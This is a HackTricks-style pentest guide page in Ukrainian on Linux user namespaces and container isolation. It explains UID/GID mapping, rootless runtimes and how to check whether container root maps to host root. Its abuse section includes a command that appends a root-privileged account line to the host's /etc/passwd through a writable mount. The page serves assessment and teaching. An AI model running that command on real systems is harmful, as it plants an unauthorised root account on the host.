# Простір імен користувачів

{{#include ../../../../../banners/hacktricks-training.md}}

## Огляд

Простір імен користувачів змінює значення user і group ID, дозволяючи kernel відображати ID, які видно всередині простору імен, на інші ID зовні нього. Це один з найважливіших сучасних захистів для контейнерів, оскільки він прямо вирішує найбільшу історичну проблему класичних контейнерів: **root всередині контейнера раніше був неприємно близьким до root на хості**.

З user namespaces процес може працювати як UID 0 всередині контейнера і при цьому відповідати діапазону неповноважених UID на хості. Це означає, що процес може поводитися як root для багатьох внутрішньоконтейнерних завдань, водночас маючи набагато менше повноважень з точки зору хоста. Це не вирішує всі проблеми безпеки контейнерів, але суттєво змінює наслідки компрометації контейнера.

## Робота

Простір імен користувачів має файли відображення, такі як `/proc/self/uid_map` і `/proc/self/gid_map`, які описують, як ID в просторі імен транслюються в батьківські ID. Якщо root всередині простору імен відображається на неповноважений хостовий UID, то операції, які вимагали б реального root на хості, просто не матимуть тієї самої ваги. Ось чому user namespaces є центральними для **rootless контейнерів** і чому вони є однією з найбільших відмінностей між старішими дефолтами з root у контейнері і більш сучасними дизайнами з принципом найменших привілеїв.

Суть тонка, але вирішальна: root всередині контейнера не знищується, він **транслюється**. Процес усе ще відчуває оточення подібне до root локально, але хост не повинен розглядати його як повноцінний root.

## Лабораторія

Ручна перевірка є:
```bash
unshare --user --map-root-user --fork bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
```
Це змушує поточного користувача виглядати як root всередині простору імен, при цьому на хості поза ним він не є root. Це один із найпростіших і найкращих прикладів для розуміння того, чому простори імен користувача такі цінні.

У контейнерах можна порівняти видиме відображення з:
```bash
docker run --rm debian:stable-slim sh -c 'id && cat /proc/self/uid_map'
```
Точний вивід залежить від того, чи движок використовує user namespace remapping або більш традиційну rootful конфігурацію.

Ви також можете прочитати відображення з боку хоста за допомогою:
```bash
cat /proc/<pid>/uid_map
cat /proc/<pid>/gid_map
```
## Runtime Usage

Rootless Podman — один із найяскравіших прикладів того, як простори імен користувачів розглядаються як механізм безпеки першого порядку. Rootless Docker також залежить від них. Підтримка userns-remap у Docker також підвищує безпеку в розгортаннях демонів з root-доступом (rootful), хоча історично багато розгортань вимикали її з міркувань сумісності. Підтримка просторів імен користувачів у Kubernetes покращилась, але впровадження та значення за замовчуванням варіюються залежно від runtime, distro та політики кластера. Системи Incus/LXC також широко покладаються на UID/GID shifting та ідеї idmapping.

Загальна тенденція зрозуміла: середовища, які серйозно використовують простори імен користувачів, зазвичай дають кращу відповідь на питання «що насправді означає root контейнера?» ніж ті, що цього не роблять.

## Advanced Mapping Details

Коли непривілейований процес записує в `uid_map` або `gid_map`, ядро застосовує суворіші правила, ніж для записувача в привілейованому батьківському просторі імен. Дозволені лише обмежені відображення, і для `gid_map` записувачу зазвичай потрібно спочатку відключити `setgroups(2)`:
```bash
cat /proc/self/setgroups
echo deny > /proc/self/setgroups
```
Ця деталь важлива, оскільки пояснює, чому налаштування простору імен користувача іноді не вдається в безпривілейових (rootless) експериментах і чому середовища виконання потребують ретельної допоміжної логіки для делегування UID/GID.

Another advanced feature is the **ID-mapped mount**. Замість зміни власності на диску, ID-mapped mount застосовує відображення простору імен користувача до mount'у так, що власність виглядає перекладеною через цей вигляд mount'у. Це особливо актуально в rootless та сучасних налаштуваннях середовищ виконання, оскільки дозволяє використовувати спільні host-шляхи без рекурсивних операцій `chown`. З точки зору безпеки, ця функція змінює те, наскільки записуваним здається bind mount ізсередини простору імен, навіть якщо вона не переписує метадані підлягаючої файлової системи.

Нарешті, пам'ятайте, що коли процес створює або входить у новий простір імен користувача, він отримує повний набір capability **всередині цього простору імен**. Це не означає, що він раптово набув загальнохостової влади. Це означає, що ті capability можна використовувати лише там, де модель простору імен та інші захисні механізми це дозволяють. Саме тому `unshare -U` може раптом зробити можливими операції з монтування або привілейовані операції, локальні для namespace, без прямого зникнення хостового кордону root.

## Неправильні налаштування

Головна вада — просто не використовувати простори імен користувача в середовищах, де це можливо. Якщо root контейнера відображається занадто прямо на host root, записувані host mounts і привілейовані операції ядра стають значно небезпечнішими. Ще одна проблема — примусове спільне використання host user namespace або відключення ремапінгу для сумісності без усвідомлення того, наскільки це змінює межі довіри.

Простори імен користувача також потрібно розглядати разом із рештою моделі. Навіть коли вони активні, широке відкриття runtime API або дуже слабка конфігурація runtime все ще можуть дозволити ескалацію привілеїв іншими шляхами. Але без них багато старих класів breakout'ів стають значно легшими для експлуатації.

## Зловживання

Якщо контейнер має root і немає розділення простору імен користувача, записуваний host bind mount стає набагато небезпечнішим, бо процес дійсно може записувати як host root. Небезпечні capability також набувають більшого значення. Атакуючому більше не потрібно так сильно долати межу трансляції, оскільки ця межа практично не існує.

Наявність або відсутність простору імен користувача слід перевіряти на ранньому етапі при оцінці шляху breakout з контейнера. Це не відповідає на всі питання, але одразу показує, чи має «root в контейнері» пряме значення на хості.

Найпрактичніший патерн зловживання — підтвердити відображення, а потім негайно перевірити, чи можна записувати в контент, змонтований з хоста, з привілеями, релевантними для хоста:
```bash
id
cat /proc/self/uid_map
cat /proc/self/gid_map
touch /host/tmp/userns_test 2>/dev/null && echo "host write works"
ls -ln /host/tmp/userns_test 2>/dev/null
```
Якщо файл створено від імені реального host root, user namespace isolation фактично відсутня для цього шляху. У цей момент класичні host-file abuses стають можливими:
```bash
echo 'x:x:0:0:x:/root:/bin/bash' >> /host/etc/passwd 2>/dev/null || echo "passwd write blocked"
cat /host/etc/passwd | tail
```
Більш безпечним підтвердженням під час live assessment є запис нешкідливого маркера замість модифікації критичних файлів:
```bash
echo test > /host/root/userns_marker 2>/dev/null
ls -l /host/root/userns_marker 2>/dev/null
```
Ці перевірки важливі, бо швидко відповідають на ключове питання: чи відповідає root у цьому контейнері достатньо точно root хоста, щоб примонтований для запису том хоста одразу став шляхом компрометації хоста?

### Повний приклад: відновлення локальних для namespace capabilities

Якщо seccomp дозволяє `unshare` і середовище дозволяє створити новий user namespace, процес може відновити повний набір capabilities всередині цього нового namespace:
```bash
unshare -UrmCpf bash
grep CapEff /proc/self/status
mount -t tmpfs tmpfs /mnt 2>/dev/null && echo "namespace-local mount works"
```
Це саме по собі не є host escape. Причина, чому це має значення, полягає в тому, що user namespaces можуть повторно ввімкнути привілейовані namespace-local дії, які згодом поєднуються з weak mounts, vulnerable kernels або badly exposed runtime surfaces.

## Checks

Ці команди покликані відповісти на найважливіше питання на цій сторінці: на що відображається root всередині цього container на host?
```bash
readlink /proc/self/ns/user   # User namespace identifier
id                            # Current UID/GID as seen inside the container
cat /proc/self/uid_map        # UID translation to parent namespace
cat /proc/self/gid_map        # GID translation to parent namespace
cat /proc/self/setgroups 2>/dev/null   # GID-mapping restrictions for unprivileged writers
```
- Якщо процес має UID 0 і файли maps показують пряме або дуже близьке host-root mapping, контейнер значно небезпечніший.
- Якщо root відображається на непривілейований діапазон хоста, це набагато безпечніша базова позиція і зазвичай вказує на реальну user namespace isolation.
- Mapping files цінніші за `id` самі по собі, бо `id` показує лише namespace-local identity.

Якщо робоче навантаження працює як UID 0 і відображення показує, що це відповідає root хоста, слід трактувати решту привілеїв контейнера набагато суворіше.
